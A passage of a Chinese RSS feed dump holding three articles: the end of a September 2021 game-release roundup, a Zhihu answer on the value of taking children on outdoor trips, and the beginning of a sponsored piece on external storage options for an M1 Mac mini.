负责，在保留原始风味的同时，增加了大量改善操作、信息查阅的新要素。</p>\n<p>原版游戏《索尼克 缤纷色彩》于 2010 年登陆了 Wii 和 NDS 平台，世嘉曾给予了它在各圈层扩大 IP 影响力的厚望，制作不可谓不卖力，可能这也是 30 周年选它来复刻的重要原因之一。在前作《索尼克世界大冒险（Sonic Unleashed）》对 3D 视角探索的基础上，接档的《索尼克 缤纷色彩》抬出了更成熟的 2D/3D 视角切换机制，并首次加入了往后常驻系列的「威斯（Wisps）」——一群附带各种增益的外星生命体，可令玩家提升属性、前往特殊区域，他们也正是标题中的「缤纷色彩」之所指。</p>\n<h2>审判之逝：湮灭的记忆 / Lost Judgement</h2>\n<blockquote><p>《如龙》框架、木村拓哉主演、聚焦庭审对抗。</p></blockquote>\n<ul>\n<li>推出日期：2021.09.24</li>\n<li>登陆平台：PS4、PS5、X1、XS S/X</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/d146441960f4207b1ac424be8b0ca148.jpg\"></figure><p>《审判之眼：死神的遗言（Judgement）》续作，与《如龙（Yakuza）》系列师出同门，两个系列共享了游戏引擎、故事舞台、时间线（就差《如龙》的角色也乱入了），部分核心主角由木村拓哉、玉木宏等一众国民级演员分饰，营造了相当高的话题度。</p>\n<p>本系列的玩法框架整体与《如龙》系列相近，开放世界注重实现「生活感」，游戏中的主要场景复刻自真实世界，且街市上有 KTV、麻将铺、街机厅之类的大量店铺可供实际进店消费，游戏世界各地还撒有相当规模的支线任务网，体验社会风情。同时，本系列还主打法庭上的对垒，因此需要玩家在开庭前多做调查，游戏提供了一整套模拟调查行为的机制，允许玩家实施乔装、跟踪、追逃、潜行、无人机侦察等动作，一切只为更镇定自若的庭上发挥。</p>\n<p>本作发售前，市场上流传出一则不和谐音，据日本媒体<a href=\"https://taishu.jp/articles/-/95672?page=2\">日刊大众报道称</a>，他们的消息源透露，主演木村拓哉所属的经纪公司杰尼斯事务所（ジャニーズ事務所）与本作制作方世嘉可能未就再推续作达成一致：世嘉方面希望，如此有潜力的 IP 应跨到 PC 平台，否则将极大限制该系列的吸金能力，守旧的杰尼斯方面则认为，旗下艺人形象可能因 PC 版推出而脱离掌控；因此，被人为砍断了财路的世嘉可能不再有意愿推出续作，即便木村拓哉本人也酷爱这个游戏系列。</p>\n<h2>暗黑破坏神 II：浴火重生 / Diablo II: Resurrected</h2>\n<blockquote><p>是那味儿吗？</p></blockquote>\n<ul>\n<li>推出日期：2021.09.24</li>\n<li>登陆平台：PS4、PS5、X1、XS S/X、NS、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/305359835e326dbc5d60485779858341.jpg\"></figure><p>今年四月份，这部《暗黑破坏神 II》的高清化重制版已经开启过一轮技术测试，虽然官方当时只开放了寥寥三个职业，但事实上可以通过破解手法解锁全部职业、离线游玩该技术测试版，这在侧面证明了本作可观的完成度。</p>\n<p>对于本作，笔者已不想再做过多推介，作为一款极富盛名的装备驱动 ARPG，其本身的玩法高度凝练、经久不衰，而暴雪在《魔兽争霸 3（Warcraft III）》重制版自食恶果后也摸清了玩家最迫切的需求、没再想当然地重做 3A 游戏——多学学《星际争霸》重制版（StarCraft: Remastered）就对了，把画面翻新、别动底层机制，多快好省。</p>\n<h2>奇纳：灵魂之桥 / Kena: Bridge of Spirits</h2>\n<blockquote><p>3D 动画专业户「转行」之作。</p></blockquote>\n<ul>\n<li>推出日期：2021.09.21</li>\n<li>登陆平台：PS4、PS5、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/41b5a9bc491523ff2ebe7fd8c4744b85.jpg\"></figure><p>一款画面表现十分惊艳的越肩视角动作冒险游戏，由具有十年以上 CG 制作背景的独立工作室 Ember Lab 出品，这也是该工作室首次推出游戏作品。本作最初定于 2020 年圣诞假期时推出，后改至今年 8 月末，因开发团队认为质量还需打磨，又在上个月临时追加延期。</p>\n<p>毋庸置疑，画面表现绝对是《奇纳：灵魂之桥》最引人注目的长板：开发团队最早用的是 Unity 引擎，后改为虚幻引擎 4，虽然大部分开发工作都针对 PS4 展开，但最终还是在索尼的支持下跨平台到了 PS5；在老到 CG 制作经验的支持下，Ember Lab 创造了一个融合东方奇幻风韵的世界观，给了本作炫目、亲切的卖相。</p>\n<p>当然了，这样的制作背景必然也指向了一些风险：毕竟这是一部游戏处女作，开发团队到底是不是在按照动画、电影等低互动媒体的思路制作游戏，在视听效果饱满、动作桥段紧张刺激之外，还有没有值得玩家们期待的东西？这还是得打个问号。</p>\n<p>一段小插曲：在调查工作室背景时，笔者意外发现 Ember Lab 跟中国还挺有缘分，他们曾负责制作了<a href=\"https://www.emberlab.com/project/coke-chinese-new-year-2016/\">可口可乐 2016 年春节广告动画</a>，其中生动的孩童形象令笔者记忆犹新。</p>\n<h2>TOEM</h2>\n<blockquote><p>端起相机，漫游世界。</p></blockquote>\n<ul>\n<li>推出日期：2021.09.18</li>\n<li>登陆平台：PS5、NS、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/97e8efbac78df54318d4827c214017ec.jpg\"></figure><p>一款轻松惬意的手绘、纸片风格作品，玩家要做的事情很简单，用相机记录风景、拍摄指定景物，或是调用场景中的机关、完成 NPC 的委托等。</p>\n<p>本作的开发团队是来自瑞典的独立工作室 Something We Made，他们评价自己的游戏是「不拘于形、自成一派（Something of its own kind）」，被他们定义为「A Photo Adventure」的《TOEM》确实也就是这样，玩家操作主角移动时是上帝视角，可以俯瞰如箱庭般可爱的整个场景，而调出相机时，玩家又会以第一人称视角看到插画一样的美妙风景，给人新奇之感。</p>\n<h2>玩具士兵：高清版 / Toy Soldiers: HD</h2>\n<blockquote><p>不仅能布置沙盘，还能空降战场。</p></blockquote>\n<ul>\n<li>推出日期：2021.09.30</li>\n<li>登陆平台：PS4、PS5、X1、XS X/S、NS、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/ec015a19fede55062e0a7214368fa109.jpg\"></figure><p>经典重现，一款有机融合了塔防、动作射击等多类型特色的游戏。本作的所有游戏内容都发生在兵人玩具盒里（场景边缘竖的墙真是盒子边），战局中，玩家需要摆放兵人模型以布置防线，可用兵人类型繁多，机枪塔、迫击炮、高射炮、步兵战车、坦克、战机等不一而足；比较特别的是，在《玩具士兵》里，玩家可以切换到兵人单位的视角，从 AI 手里接管控制权，亲自阻击目标、驰骋战场。</p>\n<p>《玩具士兵》由最早于 2010 年 3 月在 Xbox LIVE Arcade 首发，当年即成为 XBLA 销量榜冠军。如今，包含了初代本体及全部追加内容的高清版荣耀归来，开发商 Signal Studios 还宣布了初代续作《玩具士兵：冷战（Toy Soldiers: Cold Wars）》高清化、全新续作《玩具士兵 2：最美时光》两个项目，对所有《玩具士兵》系列粉丝来说，好时代可能真要来临了。</p>\n<h2>沙贝 / Sable</h2>\n<blockquote><p>美术风格给人深刻印象的开放世界解谜游戏。</p></blockquote>\n<ul>\n<li>推出日期：2021.09.23</li>\n<li>登陆平台：PS4、PS5、X1、XS S/X、PC</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/91a09b38dfa97ecf1196e4235f40d492.jpg\"></figure><p>开放世界冒险解谜游戏，由成员仅两人的独立工作室 Shedworks 主力制作，《80 天（80 Days）》《无光之海（Sunless Sea）》的剧作者 Meghna Jayanth 参与了本作的故事创作，本作的音乐则由独立摇滚乐队 Japanese Breakfast 负责。</p>\n<p>这也是一部公开得很早（2018 年）、制作得很久的游戏，按照开发者的说法，本作引导较弱，玩家可自由探索沙土漫天的游戏世界，悠然地寻觅遍布星球的迷宫，破解机关、寻找能力或宝物。</p>\n<p>如果你隐隐觉得《沙贝》包含了很多熟悉的要素，那么恭喜你：本作标志性的美术风格深受吉卜力（Studio Ghibli）、艺术家 Jean <i>Moebius</i> Giraud 的影响，后者是 Ligne claire 绘画风格的代表人物之一；不知道你喜不喜欢沙子，本作中这颗沙漠星球的灵感正是源于《星球大战（Star Wars）》系列中阿纳金·天行者（Anakin Skywalker）的故乡 Jakku，这也顺带解释了主角那台飞行器身上的既视感。</p>\n<p>以上便是部分本月值得关注的新游简介汇总，个人角度仅供参考，也欢迎大家在评论区分享更多你的体验、信息或思考。同时如果在评论区分享你这个月玩到的好游戏（不一定是新游），9 月 17 日我们将会抽选 1<strong> 位热心分享的读者</strong>各送一张<strong>价值 100 元</strong>的 Steam/PSN/Xbox/eShop 的礼品卡（任选），届时将在本文更新获奖名单。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68680"},{"title":"从小带孩子出去游玩、看世界，它能给孩子带来哪些意义？","date":"2021-09-10 04:52:22","description":"\n<p><b>“好好玩！玩完回家要写作文啊！”</b>小时候，每次出门旅行前都会被这样提醒。然后，写作文的压力，就在旅途中时不时冒出来膈应我，体验超级不好。</p>\n<p>这是我看到这个题目之后第一件想到的事，所以，原谅我这里要先diss一下我二十多年前的熊爸妈 。</p>\n<p><b>写作文不是出门玩的意义，【能不能记住什么】也并不是带孩子旅行的全部意义。</b></p>\n<p><b>有没有意义，取决于孩子跟着什么样的人。</b></p>\n<p>因为认知的不同，孩子有自己看世界的独特角度。不同年龄的孩子们去游玩、看世界，都能有不一样的收获。</p>\n<p>这些收获，可能是认识了一两种新的植物；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-716c32f639da9a8df62eeb9cd1c65b42_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1500\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-716c32f639da9a8df62eeb9cd1c65b42\" data-watermark-src=\"v2-0a99899aeaa80b4cc9edf3e05ec31f60\" data-private-watermark-src=\"v2-cd70d9d0fa341479a558b2c1738ea7da\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-55817cb7b6dc42b397209fae6878903e_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1500\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-55817cb7b6dc42b397209fae6878903e\" data-watermark-src=\"v2-ae2883fe667f223a49f7ef17328ea975\" data-private-watermark-src=\"v2-0fd175896c90d772d802a61f5f3db858\"></p>\n<p>可能是知道了爬山虽然有点累，但坚持坚持就能看到更美的风景；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-807dbb28279c21be12b5a33fcaf9fbee_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-807dbb28279c21be12b5a33fcaf9fbee\" data-watermark-src=\"v2-e907891c264c54f568ef91d3663c7f86\" data-private-watermark-src=\"v2-75e5ba3931ced67c8ac44f4a876b4382\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-23f926f586fa89887520db474ab725a8_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1333\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-23f926f586fa89887520db474ab725a8\" data-watermark-src=\"v2-ed470cd6810b5e2ae759b08728c24e30\" data-private-watermark-src=\"v2-ffdb4971c34916546d65e8ec21075bfd\"></p>\n<p>可能是见到了只在书里看到过的交通工具；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-37944bc500a30a52f5c7d9c8315ef7cf_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1500\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-37944bc500a30a52f5c7d9c8315ef7cf\" data-watermark-src=\"v2-69923e8af55e2f70dfec17c5e0be3d4d\" data-private-watermark-src=\"v2-0a90dc212f1cd265e8d989abc719ff88\"></p>\n<p>可能只是学会了自己收拾行李；</p>\n<p>还有可能发现【走出去】能看见那么多有意思的东西，而对世界充满好奇。</p>\n<p>所以每次说到带娃去哪儿玩，常常被质疑说“孩子小了，根本记不住！”我都一脸黑线！<b>记不记得住，真的只是我们衡量带孩子旅行有没有收获的诸多维度之一。</b>记不住旅途的所见所闻，绝不代表没有收获。</p>\n<p>带四岁的小皮皮旅行过十几次，现在移居到大理之后，更是户外活动不断。</p>\n<p>在一次次的户外活动中，我一直在思考，怎样让孩子的旅途更有趣，有更多收获。</p>\n<p>最后发现，<b>在观察中发现兴趣，以兴趣为切入点，带孩子去探索发现，回家之后还可以拓展</b>（看相关视频，查阅资料）。</p>\n<p>最后，这一次拓展延伸的结果，还可以生成下一次安排户外活动的主题。</p>\n<h2>分享小皮皮的几次户外活动，以及我从中发现的教育契机。</h2>\n<h2>只要有心，每一次的收获都不同。</h2>\n<p><b>一、寻找“蝴蝶的世界”。</b></p>\n<p>小皮皮偶然在小区看见一只颜色奇怪的蝴蝶，我说：“哇！蝴蝶！”小皮皮说：“这不是蝴蝶，蝴蝶是黄色和白色的，也没有这么大！”</p>\n<p>我没有马上否定，突然想好下次的户外活动的目的地了：“蝴蝶泉”。</p>\n<p>出发之前我告诉他这次目的地的名字，让他猜猜那是个什么样的地方。到达目的地，小皮皮超级期待，走得比大人还快。第一站是【蝴蝶博物馆】，在一个温室里，有好多种蝴蝶飞来飞去。</p>\n<p>我没有在他看得认真的时候，急着讲解，我相信孩子天然的好奇心。在他问我第一个问题的时候，我终于有机会搬出了查阅已久的资料，告诉他，并不是只有我们经常看见的那种蝴蝶才是蝴蝶，仅仅在中国，蝴蝶就有好几千种呢！</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d5cdd4bb81d04039eb239cdc6f8bf1f0_720w.jpg?rss\" data-rawwidth=\"1299\" data-rawheight=\"1080\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-d5cdd4bb81d04039eb239cdc6f8bf1f0\" data-watermark-src=\"v2-e2da9ef27781e92a65e31c338f833918\" data-private-watermark-src=\"v2-6c1dd53e01ea53a190c8fa4dcc7e2786\"></p>\n<p>到这里，小皮皮又开始继续观察，我就没有说下去。等他下次发问，又可以继续科普。</p>\n<p>看蝴蝶的过程中，发现地上也有好多蝴蝶，很多都被游客不小心踩死，我和小皮皮用一个袋子套着手，把蝴蝶送到树上去。他知道自己救了小动物，特别开心。</p>\n<p>这次的过程，小皮皮不仅得到了【自然科普】，还帮助了小动物，体验到付出爱心的快乐，我觉得很有意义。</p>\n<p><b>二、爬山，找蘑菇，带走垃圾。</b></p>\n<p>雨季的时候，云南的山里有各种各样的蘑菇。蘑菇这么可爱的物种，是一定要带小皮皮去看看的。</p>\n<p>很多有毒，所以没有摘，更没有吃，只是蹲下来认真欣赏就很满足了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7a6add67ecb59a8646c1d9cd72ad6cb3_720w.jpg?rss\" data-rawwidth=\"1125\" data-rawheight=\"1750\" data-size=\"normal\" data-watermark=\"watermark\" data-original-src=\"v2-7a6add67ecb59a8646c1d9cd72ad6cb3\" data-watermark-src=\"v2-90a0494c81426a85ea7a50191dffa684\" data-private-watermark-src=\"v2-a513174e975ddabc758d65f43cbfcb5d\"></p>\n<p>路上会遇到超可爱的松鼠，完全不怕人，小皮皮真正感受到自然的和谐。</p>\n<a href=\"https://www.zhihu.com/video/1419637724492386304\"></a><p>偶尔会发现矿泉水瓶和塑料袋，就和小皮皮讨论，这么美的自然环境，不应该出现这些东西，而且如果小动物不小心吃掉，还会被伤害。</p>\n<p>下山的时候，捡走了一大袋垃圾。我们约定，之后不会乱扔垃圾，条件允许的情况下，也会像今天一样，带走大自然中别人留下的垃圾。</p>\n<p>我想，小皮皮虽然还不太明白所以然，但至少有一些初步的环保意识了吧。</p>\n<p>回家之后，我也会和他一起看看关于地球的小短片，知道我们为什么要保护地球上的小动物和植物们。</p>\n<p>这一次的爬山，我相信小皮皮也不仅仅是锻炼了身体，体会到寻找蘑菇的开心，更懵懵懂懂的知道了，要保护环境。</p>\n<p><b>生活皆教育，只要有心，就有无数契机。</b></p>\n<p><a class=\"member_mention\" href=\"http://www.zhihu.com/people/85724f4099df3bbe69b629eb969367e4\" data-hash=\"85724f4099df3bbe69b629eb969367e4\" data-hovercard=\"p$b$85724f4099df3bbe69b629eb969367e4\">@知乎亲子</a> </p>\n<p><br></p>\n<p><a class=\"member_mention\" href=\"http://www.zhihu.com/people/85724f4099df3bbe69b629eb969367e4\" data-hash=\"85724f4099df3bbe69b629eb969367e4\" data-hovercard=\"p$b$85724f4099df3bbe69b629eb969367e4\">@知乎亲子</a> </p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/pi-pi-de-dan-dan-66?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Bonnie的小皮皮</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/361818529/answer/2113016187?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">175 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/436028351?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待最好的亲子活动是带着孩子去观察和感受大自然，带着孩子去旅行是很有意义的一件事吗？</a><br><a href=\"http://www.zhihu.com/question/451183807?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">既然 1 岁孩子小什么都不懂，那么带 1 岁孩子出去旅游是浪费吗？</a><br>\n","link":"http://www.zhihu.com/question/361818529/answer/2113016187?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"国物馆 | 想要 Mac 能撑下更多内容？不妨试试这些高性价比的存储好物","date":"2021-09-10 03:30:00","description":"\n<h4><strong>编者注：</strong></h4>\n<p>在对消费者需求不断探索与「为国民，造好物」品牌理念的加持下，<a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 将现代年轻消费者的个性心理与传统文化巧妙结合，力求为大家带来更多时尚、潮流、有现代科技感、技术应用快人一步、高品质且价格友好的产品——而有着与之相同愿景的国货品牌亦不胜枚举。</p>\n<p>我们支持国际化潮流并主张消费自由，但不少平价好用的国货同时也正在被生生埋没，成为你购物车中不曾有过的遗珠之憾。于是少数派联合我们的好朋友 <a href=\"https://www.aigo.com/\" target=\"_blank\">aigo</a> 一起开启了这次国货推荐的征文活动，邀请了一些作者来分享他们使用下来认为不错的国货，在予你受用的同时也希望借此机会让更多的国货被看见。如果你也有心仪的国货想要推荐，非常欢迎你向我们投稿。</p>\n<hr>\n<h2>从 M1 说起</h2>\n<p>近一年过去，M1 芯片的杰出之处早已不用赘述。苹果闷声憋出的大招，仿佛是抢走了老朋友 Intel 的牙膏。性能大幅进步的同时，众多机型里最便宜的 Mac mini 教育优惠下不足五千的价格，在矿机横行、显卡天价的日子里，居然难得地把「性价比」三个字大写在了苹果脸上。</p>\n<p>但 M1 并不完美。继承和发扬光大了苹果对电脑的设计理念的同时，M1 芯片虽使 Mac 性能提升、发热降低，却也导致拓展性的不足。当然，拓展不足也不是新问题了，即便仍使用 Intel 芯片的机型，苹果给的接口也很不够用。</p>\n<p>这或许和乔布斯留下的理念有关，在很早以前乔布斯就和沃兹争论，认为电脑应该只留两个 USB 接口、不需要风扇。如今，乔布斯的愿景通过自研的 M1 芯片加持终于可以实现，所以即使有传闻说下一代 MacBook 会增加接口数量，纵观苹果历史上多次的选择，我还是不能轻易相信它会转变自己在开放性上的保守政策。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4resm5b34t897udghq0.jpeg\"><figcaption>M1 Mac mini 配备的接口</figcaption></figure><p>M1 系列产品也比以往的 Intel 产品线更加保守，各个版块焊死在主板上，彻底失去 DIY 的可能。这样的统治力成就了苹果高超的设计美学，却同时也让用户不得不遭受它保守态度的痛苦：虽然基础售价难得「亲民」，但和往常一样高昂的内存、存储升级价格，又实在是接受不能。</p>\n<p>在 Apple 官网，要想将存储从 256GB 升到 512GB，需要加 1500 人民币；而最高配的 2T 版本，需要加 5550 块钱。虽然内置存储用起来是最爽的，但居然要花掉比电脑本体还多的钱，无力支出；况且，就算升满 2T，作为一款 2021 年的台式电脑还是不大够用。所以说，投入 Mac 的怀抱，也就意味着你需要自己动手解决拓展、存储等一系列的问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4resmlb34t893up9ebg.jpeg\"><figcaption>M1 Mac mini 高昂的存储升级价格</figcaption></figure><p>作为穷学生，均衡考虑之后，我在年初购入了入门级的 256G 版 Mac mini。256G 即便放在手机上也不能说是富余，电脑上就更不必说。这大概就是苹果的理想和我的现实之间的矛盾吧。 因而，我开始了漫长的存储设备探索之路，没想到路长水深，一路摸索下来，如今断断续续花费超过一万块，已经是 Mac mini 两倍的钱。其中有血泪教训也有惊艳发现，算是折腾明白了。本文就是我过去大半年的经验总结，很折腾，也很有趣。希望对意图购买或已经拥有 Mac 的你有所帮助。</p>\n<p>需要提前说明的是，M1 芯片存在某种问题，使得通过拓展坞外连的硬盘无法发挥最大速度。从网上的反馈来看，不同品牌的不同产品均受到影响，本文中测试的产品亦因此达不到标称满速，希望苹果在系统升级或至少下代产品里改掉这一问题。</p>\n<h2>明确需求</h2>\n<p>市面上有许多种外置存储的解决方案，从硬盘到接口横跨数个类别。想要搞清楚哪一款是我需要的，就要先搞清楚自己的需求。</p>\n<p>我有制作视频的需要，工程文件动辄几十个 G，而且工作时要保持高读写速度；现在是 4K 时代，素材的文件大小比 1080P 时翻倍增长，如果想要妥善保存，就一定得要够大的存储空间。此外，我也有在两台电脑间转移文件的需求，虽然大部分可以通过隔空投送完成，但电脑容积有限，大文件还是保存在硬盘中更方便。</p>\n<p>故此，我们来建立一个以容量大小、读写速度为 X、Y 轴的坐标系，毫无疑问，高容量高读写是追逐的目标，低容量低读写则是当被淘汰的上代产品。但是坐标的两极也代表价格的两极，我们需要在价格和适用性上做出取舍。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4resmtb34t897udghqg.jpeg\"><figcaption>需求坐标轴</figcaption></figure><p>在表中，对于低容量低读写的碎片文件，这里本是 U 盘的市场，如今隔空投送就可以解决，不再探讨；M1 Mac mini 的绝大部分用户，需求还是位于小容量、高读写的拓展文件、高容量低读写的备份文件之中。我们可以在这个范围内多寻找一些产品。</p>\n<h2>初步发烧：了解硬盘、接口、带宽与协议</h2>\n<p>对于手中富余的朋友，或者追求极致性能的爱好者，在了解自身需求后直接买市面上最贵的产品往往就足够让你满意。但要是想追逐一下性价比，就要在背景知识上做更多功课。而在外部存储这件事上，你至少需要了解硬盘的种类、接口的区别、带宽的不同，以及各种各样的协议。</p>\n<p>数据传输就像赛车，影响车速的除了车本身，还有路况和交通规则。如果数据是车上的货物，那么硬盘就是车，接口是交通枢纽，带宽是道路，协议是交通规则。这构成了木桶效应，真正使用时的速度就取决于这几者中较慢的那个。</p>\n<p>比如用雷电三的接口和带宽跑传输速度 200MB/s 的 SATA 机械硬盘，那就是慢车上了笔直的赛道、高吞吐量的路口，再怎么耍也还是 200MB/s，这并不能提高车的速度；反过来说，一块 M.2 的 SSD，纵使猛踩 3500MB/s 的油门，碰到 USB 3.1 Gen 1 的路口也只能慢慢排队，跑出个最大 625MB/s 的成绩。</p>\n<h3>如何选购硬盘</h3>\n<p>相信你一定常听说「机械硬盘」和「固态硬盘」两个概念，知道固态更贵、速度更快。确实，从科技点上来讲二者已是差了代际的产物，从 SATA 机械到 SATA 固态，再到 M.2 接口的 NVME 固态，速度起飞式上升，但价格也是水涨船高。SATA、M.2，都是接口的一种，为了方便理解，我制作了一张图阐述它们的区别。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/09/a9f6cabde26cfbf997fd6a18cad895b1.jpg\"></figure><p>道路就是基础建设，是很难变动的，SATA 作为较早出现的总线标准，在存储界早已普及；但 SATA 最普及的 3.0 版本，带宽只有 6Gbps，传输速度换算下来只有 600MB/s。如果是市面上较为流行的 SATA 机械硬盘，比如我手中有一块西部数据的 4T WD40EZRZ，实际速度大概在 170MB/s。</p>\n<p>固态硬盘出现以后，很长时间内依然以 SATA 为主要接口，这就导致 SATA 固态虽然速度大幅超过机械硬盘，但受制于带宽，仍然无法突破 600MB/s 的理论速度。与此同时，作为固态硬盘，SATA 固态依然有价格不低、容量不高的问题。</p>\n<p>SATA 固态硬盘针对的使用场景更多是 PC，而 Mac mini 上并没有 SATA 接口，因此，尽管它的读写速度尚可接受，我也不推荐你购入外置的 SATA 固态硬盘作为拓展。毕竟它的同等容量价格并不比速度翻倍的 M.2 接口固态硬盘低到哪里去。</p>\n<p>所以，在硬盘的选购上，M.2 固态硬盘是较好的选择，而对于备份等速度要求不大、容量要求高的需求，SATA 机械硬盘是价格更合适的方案。</p>\n<h3>速度、接口与协议</h3>\n<p>是不是已经有点绕了？我们再来明确几个概念。</p>\n<p>先是速度的单位：Gbps。「bps」的全称是「bits per second」，即比特率。存储大小是以字节「Byte」为单位的，而一字节对应八比特，就像网速一样，100Mbps 的宽带理论下载速度是 12.5MB/s。在实际使用中，由于物理损耗，这个数字会更低。购买拓展坞、硬盘坞时，我们常能看到商品页上显示的 5Gbps、10Gbps，转换单位时理论最大速度要除以八，也就是 625MB/s、1250MB/s。有时考虑到编码效率，这个数字还要更低。</p>\n<p>说完速度，再讲讲接口和协议。M1 Mac mini 配备了两个雷雳/USB 4 和两个 USB-A 接口。名叫 USB 4，其实就是雷电 3。协议们的命名非常拗口，不说人话，是各家势力妥协的结果，背后纷争我们没必要细究，只要记住搭载 M1 芯片的几款机型，从 Mac 到 iPad，所用的都是雷电 3 接口即可。雷电 3 口的带宽可达 40Gbps，换算下来就是 5GB/s。</p>\n<p>但实际上，雷电 3 的带宽中，分配给数据传输的只有 22Gbps，剩下的 18Gbps 是给视频信号的。可以理解为在这宽广的 40Gbps 公路上，有 18Gbps 是视频数据专用车道，其他数据们只能跑 22Gbps。估算下来就是 2750MB/s。这就是 M1 芯片外接硬盘能跑出的理论速度上限。在实际使用中，M1 存在 BUG，无法达到这一速度；而硬盘格式、测速软件的算法不同，也都会影响速度呈现。</p>\n<p>初步了解存储界的种种规则，终于，我们可以来挑选挑选产品了。</p>\n<h2>初始方案：大容量机械硬盘</h2>\n<p>各位都知道 NAS，是以网络的方式接入存储设备（Network-Attached Storage），而 DAS 其实更为古老，是硬盘和处理设备直连的接入方案（Direct-Attached Storage）。这也是我为 Mac mini 拓展时的初版方案。事后来看这不算最好的选择。或许，256G 过于捉襟见肘，买大容量硬盘可能也是种心理补偿。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4resndb34t893up9ec0.jpeg\"><figcaption>NAS ? DAS ?</figcaption></figure><p>在搭建这套方案时，我尚在校园，搭 NAS 有些网络上的麻烦，加上主力设备就是这台 Mac mini，于是选择了 DAS。借着年初机械硬盘价格还不错，我择机购入了前文提到的西部数据的 4T 蓝盘，搭配国产品牌铁威马的双盘位硬盘坞 D2-310，实测的速度在 170MB/s 上下。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4resnlb34t893up9ecg.jpeg\"><figcaption>西部数据 蓝盘 4T WD40EZRZ 连接 铁威马 D2-310</figcaption></figure><p>数据是很娇贵的，选择硬盘坞和选择硬盘有时同样重要。这款国产品牌铁威马的 D2-310 我在某东以 499 元的价格购入，不算最便宜的硬盘坞产品，但相比销量更高的露天硬盘底座，它金属全包裹的设计不仅好看，也能更好地保护硬盘和内在的数据——要知道，露天硬盘底座可是有个「硬盘升天座」的诨名。还有玩家会推荐二手购入西部数据、希捷等品牌的拆机盒子，某二手市场两百来块，但需要做一些硬件上的破解，方案不是很成熟，有潜在风险，我就没有采用。</p>\n<p>4T 的机械硬盘确实极大地缓解了我的存储焦虑。不过，如今半年多使用下来，我认为 DAS 作为古老且低速的方案，硕大的体积、使用时的噪声和入手门槛，使它或许不能算是友好的选择。况且，机械硬盘的外置存储占用的是 USB-A 接口，真正高速且昂贵的雷电 3 并没有机会发挥实力。所以，体验了半年后，我不大建议你选用这套方案。</p>\n<h2>进阶方案：移动固态硬盘</h2>\n<p>林林总总说了许多存储界的入门知识，可能有人会问我：为什么不直接买移动硬盘？对我来说，这和我过往的体验有关。为了给老 MacBook 留下冗余备份，我也曾购置过一些五六百价位的移动硬盘，巴掌大小，使用起来谈不上便利，有些笨重，也还算能忍受。后来我又购置了一块给家里人。结果几年下来，由于携带不便，我早已忘记自己的移动硬盘塞到了哪个旮旯；而家里人也和我反应，说那块我买的硬盘坏掉了，内容不翼而飞。种种体验，让我留下了「移动硬盘确实不行」的印象。现在回头看，这也许是种错怪，当时我的收纳习惯不够好，家人使用时也多有不注意，导致我产生了些偏见。</p>\n<p>这次，借着少数派与 aigo 的合作机会，深度体验了 aigo 送来的 S7 Pro 后，我发现时代确实变了。首先是它真的很小巧，比 AirPods 